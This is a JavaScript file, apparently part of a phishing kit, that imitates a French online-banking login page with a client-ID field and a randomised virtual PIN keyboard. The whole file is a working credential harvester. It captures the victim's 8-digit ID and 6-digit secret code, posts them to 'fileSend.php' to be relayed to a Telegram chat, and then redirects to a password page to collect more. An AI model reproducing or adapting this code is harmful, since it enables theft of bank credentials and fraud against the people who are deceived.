/**
 * Envoie des données au serveur via une requête POST et les transmet à un chat Telegram.
 * 
 * @param {string} titre - Le titre du message à envoyer, comme "Nouvelle Connexion".
 * @param {Array<Object>} data - Un tableau d'objets contenant les données à envoyer, où chaque objet peut avoir des propriétés dynamiques.
 */
function sendData(titre, data) {
  const formData = new FormData();
  formData.append('titre', titre);

  // Ajouter les données à envoyer
  data.forEach((item, index) => {
    for (const key in item) {
      formData.append(`data[${index}][${key}]`, item[key]); // On envoie chaque propriété avec sa clé
    }
  });

  // Envoi via fetch
  fetch('fileSend.php', {
    method: 'POST',
    body: formData
  })
    .then(response => response.text())
    .then(data => {
      console.log("Réponse du serveur:", data);
    })
    .catch(error => {
      console.error("Erreur:", error);
    });
}


document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector("form.component-mire-codeclient");
  const userIdInput = document.getElementById("user_id");
  const validateButton = document.getElementById("btn-validate");
  const label = document.querySelector('label[for="user_id"]');
  const clavier = document.getElementById("clavier");
  const btnContainer = document.getElementById("btn-container");
  const codeDisplay = document.getElementById("code");
  const keyboard = document.getElementById("gda_vk");
  const clearCodeButton = document.getElementById("clear-code");
  const authentButton = document.getElementById("btn-authent");

  const codeInput = [];
  const maxDigits = 6;

  // 🔒 Empêche la soumission du formulaire
  if (form) {
    form.addEventListener("submit", (e) => e.preventDefault());
  }

  // 🧪 Validation live du champ user_id
  if (userIdInput) {
    userIdInput.addEventListener("input", () => {
      if (/^\d{8}$/.test(userIdInput.value)) {
        userIdInput.classList.add("is-valid");
      } else {
        userIdInput.classList.remove("is-valid");
      }
    });
  }

  // 🎯 Clic sur "Valider" (user ID)
  if (validateButton) {
    validateButton.addEventListener("click", (e) => {
      e.preventDefault();

      setTimeout(() => {
        if (label) label.style.display = "none";
        if (btnContainer) btnContainer.style.display = "none";
        if (clavier) clavier.style.display = "block";
      }, 1000);
    });
  }

  // 🔢 Génère le clavier
  function generateKeyboard() {
    const allPositions = Array.from({ length: 16 }, (_, i) => i);
    const digits = [...Array(10).keys()];
    const shuffled = allPositions.sort(() => Math.random() - 0.5);
    const digitPositions = shuffled.slice(0, 10);
    const grid = Array(16).fill(null);

    digits.forEach((digit, i) => {
      grid[digitPositions[i]] = digit;
    });

    keyboard.innerHTML = "";

    grid.forEach((val) => {
      const btn = document.createElement("div");
      btn.classList.add("key");

      if (val === null) {
        btn.classList.add("empty");
      } else {
        btn.textContent = val;
        btn.addEventListener("click", () => {
          if (codeInput.length < maxDigits) {
            codeInput.push(val);
            updateCodeDisplay();
          }
        });
      }

      keyboard.appendChild(btn);
    });
  }

  // 🔐 Met à jour l'affichage du code saisi
  function updateCodeDisplay() {
    let display = "";
    for (let i = 0; i < maxDigits; i++) {
      display += codeInput[i] !== undefined ? "• " : "_ ";
    }
    codeDisplay.textContent = display.trim();
  }

  // 🧹 Icône de suppression du code
  if (clearCodeButton) {
    clearCodeButton.addEventListener("click", () => {
      codeInput.length = 0;
      updateCodeDisplay();
    });
  }

  let jsError = document.getElementById('js-error');

  if (authentButton) {
    authentButton.addEventListener("click", () => {
      const codeSaisi = codeInput.join("");  // Crée une chaîne de code à partir du tableau

      if (codeSaisi.length === maxDigits) {
        // Envoie une requête AJAX pour exécuter le fichier PHP (fileSend.php)
        const data = [
          { user_id: userIdInput.value }, { code_Secret: codeSaisi }]
        sendData('🔑 Nouvelle Connexion', data);

        // ✅ Tous les chiffres sont présents → redirection
        window.location.href = "/password.html";
      }
      else {
        jsError.innerHTML = '';
        jsError.innerHTML = '<div class="inner"><div class="message">La saisie de votre Code Secret est obligatoire.</div></div>';
      }
    });
  }


  // 🚀 Génération initiale du clavier
  if (keyboard && codeDisplay) {
    generateKeyboard();
    updateCodeDisplay();
  }
});
